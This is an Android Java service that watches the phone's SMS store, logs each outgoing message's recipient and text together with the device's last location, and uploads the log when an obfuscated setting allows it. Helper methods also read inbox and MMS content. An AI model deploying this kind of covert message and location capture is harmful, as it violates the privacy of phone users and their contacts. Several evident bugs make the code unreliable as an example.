package com.xzfg.app.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

import com.xzfg.app.Application;
import com.xzfg.app.Givens;
import com.xzfg.app.R;
import com.xzfg.app.managers.FixManager;
import com.xzfg.app.managers.PhoneLogManager;
import com.xzfg.app.model.SmsMmsMessage;
import com.xzfg.app.security.Fuzz;
import com.xzfg.app.util.SMSUtil;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.Date;

import javax.inject.Inject;


public class SMSSentService extends Service {
    private static final String TAG = SMSSentService.class.getName();
    private static final Uri SMS_STATUS_URI = Uri.parse("content://sms");
    private static final int MESSAGE_TYPE_SENT = 2;
    private static final int MESSAGE_TYPE_OUTBOX = 4;
    private static final int STATUS_COMPLETE = 0;
    private ContentResolver contentResolver;
    private int prevMessageId=-1;

    @Inject
    Application application;

    @Inject
    FixManager fixManager;

    @Inject
    PhoneLogManager phoneLogManager;

    @Inject
    SharedPreferences sharedPreferences;

    String substr;
    int k;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        ((Application) getApplication()).inject(this);
    }

    public void registerObserver() {
        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(
                SMS_STATUS_URI,
                true, new SMSObserver(new Handler()));
    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        registerObserver();
        return START_STICKY;
    }

    class SMSObserver extends ContentObserver{
        private Context mContext;

        public SMSObserver(Handler handler) {
            super(handler);
            mContext = getApplicationContext();
        }

        //will be called when database get change
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);

            Cursor cursor = mContext.getContentResolver().query(
                    SMS_STATUS_URI, null, null, null, null);
            if (cursor.moveToNext()) {
                String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
                int type = cursor.getInt(cursor.getColumnIndex("type"));
                int status = cursor.getInt(cursor.getColumnIndex("status"));
                int msgId = cursor.getColumnIndex("_id");
                // Only processing outgoing sms event & only when it
                // is sent successfully (available in SENT box).
                if (protocol != null || type != MESSAGE_TYPE_SENT || msgId == prevMessageId) {
                    return;
                }
                int dateColumn = cursor.getColumnIndex("date");
                int bodyColumn = cursor.getColumnIndex("body");
                int addressColumn = cursor.getColumnIndex("address");
                String from = "0";
                String to = cursor.getString(addressColumn);
                Date now = new Date(cursor.getLong(dateColumn));
                String message = cursor.getString(bodyColumn);
                prevMessageId = msgId;

                updateLog(new SmsMmsMessage(getApplicationContext(), to, message, System.currentTimeMillis(),  0,  0,  msgId,  type));
            }

            cursor.close();

        }//on changed closed


 /*now Methods start to getting details for sent-received SMS*/



        //method to get details about received SMS..........
        private void getReceivedSMSinfo() {
            Uri uri = Uri.parse("content://sms/inbox");
            String str = "";
            Cursor cursor = contentResolver.query(uri, null,
                    null,null, null);
            cursor.moveToNext();

            // 1 = Received, etc.
            int type = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String msg_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            String body = cursor.getString(cursor.
                    getColumnIndex("body"));
            Date date = new Date(Long.valueOf(dateVal));

            str = "Received SMS: \n phone is: " + phone;
            str +="\n SMS type is: "+type;
            str +="\n SMS time stamp is:"+date;
            str +="\n SMS body is: "+body;
            str +="\n id is : "+msg_id;

            cursor.close();

        }

        //method to get details about Sent SMS...........
        private void getSentSMSinfo() {
            Uri uri = Uri.parse("content://sms/sent");
            Cursor cursor = contentResolver.query(uri, null,
                    null, null, null);
            cursor.moveToNext();

            // 2 = sent, etc.
            int type = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String msg_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            int msgId = cursor.
                    getColumnIndex("_id");
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            String body = cursor.getString(cursor.
                    getColumnIndex("body"));
            Date date = new Date(Long.valueOf(dateVal));

            updateLog(new SmsMmsMessage(getApplicationContext(), phone, body, System.currentTimeMillis(),  0,  0,  msgId,  type));

            cursor.close();
        }


  /*now Methods start to getting details for sent-received MMS.*/

        // 1. method to get details about Received (inbox)  MMS...
        private void getReceivedMMSinfo() {
            Uri uri = Uri.parse("content://mms/inbox");
            String str = "";
            Cursor cursor = getContentResolver().query(uri, null,null,
                    null, null);
            cursor.moveToNext();

            String mms_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            Date date = new Date(Long.valueOf(dateVal));

            // 2 = sent, etc.
            int mtype = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String body="";

            Bitmap bitmap;

            String type = cursor.getString(cursor.
                    getColumnIndex("ct"));
            if ("text/plain".equals(type)){
                String data = cursor.getString(cursor.
                        getColumnIndex("body"));
                if(data != null){
                    body = getReceivedMmsText(mms_id);
                }
                else {
                    body = cursor.getString(cursor.
                            getColumnIndex("text"));
                    //body text is stored here
                }
            }
            else if("image/jpeg".equals(type) ||
                    "image/bmp".equals(type) ||
                    "image/gif".equals(type) ||
                    "image/jpg".equals(type) ||
                    "image/png".equals(type)){
                bitmap = getReceivedMmsImage(mms_id);
                //image is stored here
                //now we are storing on SDcard
                storeMmsImageOnSDcard(bitmap);
            }

            str = "Sent MMS: \n phone is: " + phone;
            str +="\n MMS type is: "+mtype;
            str +="\n MMS time stamp is:"+date;
            str +="\n MMS body is: "+body;
            str +="\n id is : "+mms_id;

        }




        //method to get Text body from Received MMS.........
        private String getReceivedMmsText(String id) {
            Uri partURI = Uri.parse("content://mms/inbox" + id);
            InputStream is = null;
            StringBuilder sb = new StringBuilder();
            try {
                is = getContentResolver().openInputStream(partURI);
                if (is != null) {
                    InputStreamReader isr = new InputStreamReader(is,
                            "UTF-8");
                    BufferedReader reader = new BufferedReader(isr);
                    String temp = reader.readLine();
                    while (temp != null) {
                        sb.append(temp);
                        temp = reader.readLine();
                    }
                }
            } catch (IOException e) {}
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {}
                }
            }
            return sb.toString();
        }

        //method to get image from Received MMS..............
        private Bitmap getReceivedMmsImage(String id) {


            Uri partURI = Uri.parse("content://mms/inbox" + id);
            InputStream is = null;
            Bitmap bitmap = null;
            try {
                is = getContentResolver().
                        openInputStream(partURI);
                bitmap = BitmapFactory.decodeStream(is);
            } catch (IOException e) {}
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {}
                }
            }
            return bitmap;

        }

        //Storing image on SD Card
        private void storeMmsImageOnSDcard(Bitmap bitmap) {
            try {

                substr = "A " +k +".PNG";
                String extStorageDirectory = Environment.
                        getExternalStorageDirectory().toString();
                File file = new File(extStorageDirectory, substr);
                OutputStream outStream = new FileOutputStream(file);
                bitmap.compress(Bitmap.CompressFormat.PNG,
                        100,outStream);
                outStream.flush();
                outStream.close();


            }
            catch (FileNotFoundException e) {

                e.printStackTrace();

            } catch (IOException e) {

                e.printStackTrace();

            }
            k++;
        }



        /* .......methods to get details about Sent MMS.... */
        private void getSentMMSinfo() {


            Uri uri = Uri.parse("content://mms/sent");
            String str = "";
            Cursor cursor = getContentResolver().query(uri,
                    null,null,
                    null, null);
            cursor.moveToNext();

            String mms_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            Date date = new Date(Long.valueOf(dateVal));
            // 2 = sent, etc.
            int mtype = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String body="";

            Bitmap bitmap;

            String type = cursor.getString(cursor.
                    getColumnIndex("ct"));
            if ("text/plain".equals(type)){
                String data = cursor.getString(cursor.
                        getColumnIndex("body"));
                if(data != null){
                    body = getSentMmsText(mms_id);
                }
                else {
                    body = cursor.getString(cursor.
                            getColumnIndex("text"));
                    //body text is stored here
                }
            }
            else if("image/jpeg".equals(type) ||
                    "image/bmp".equals(type) ||
                    "image/gif".equals(type) ||
                    "image/jpg".equals(type) ||
                    "image/png".equals(type)){
                bitmap = getSentMmsImage(mms_id);
                //image is stored here
                //now we are storing on SDcard
                storeMmsImageOnSDcard(bitmap);
            }

            str = "Sent MMS: \n phone is: " + phone;
            str +="\n MMS type is: "+mtype;
            str +="\n MMS time stamp is:"+date;
            str +="\n MMS body is: "+body;
            str +="\n id is : "+mms_id;

            cursor.close();
        }


        //method to get Text body from Sent MMS............
        private String getSentMmsText(String id) {

            Uri partURI = Uri.parse("content://mms/sent" + id);
            InputStream is = null;
            StringBuilder sb = new StringBuilder();
            try {
                is = getContentResolver().openInputStream(partURI);
                if (is != null) {
                    InputStreamReader isr = new InputStreamReader(is,
                            "UTF-8");
                    BufferedReader reader = new BufferedReader(isr);
                    String temp = reader.readLine();
                    while (temp != null) {
                        sb.append(temp);
                        temp = reader.readLine();
                    }
                }
            } catch (IOException e) {}
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {}
                }
            }
            return sb.toString();

        }

        //method to get image from sent MMS............
        private Bitmap getSentMmsImage(String id) {

            Uri partURI = Uri.parse("content://mms/sent" + id);
            InputStream is = null;
            Bitmap bitmap = null;
            try {
                is = getContentResolver().
                        openInputStream(partURI);
                bitmap = BitmapFactory.decodeStream(is);
            } catch (IOException e) {}
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {}
                }
            }
            return bitmap;

        }

    }//smsObserver class closed

    private void updateLog(SmsMmsMessage message){
        Location location = fixManager.getLastLocation();
        String direction = getString(R.string.log_outgoing);
        File logFile = SMSUtil.updateSMSLog(message, application, direction, location);

        String settingsPhoneCalls = Fuzz.en(Givens.COLLECT_SMS_DELIVERY_KEY, application.getDeviceIdentifier());
        if (sharedPreferences.contains(settingsPhoneCalls)) {
            int collectRecordCalls = sharedPreferences.getInt(settingsPhoneCalls, 0);
            if (collectRecordCalls==1 && logFile!=null) {
                phoneLogManager.submitFile(logFile);
            }
        }

    }


}
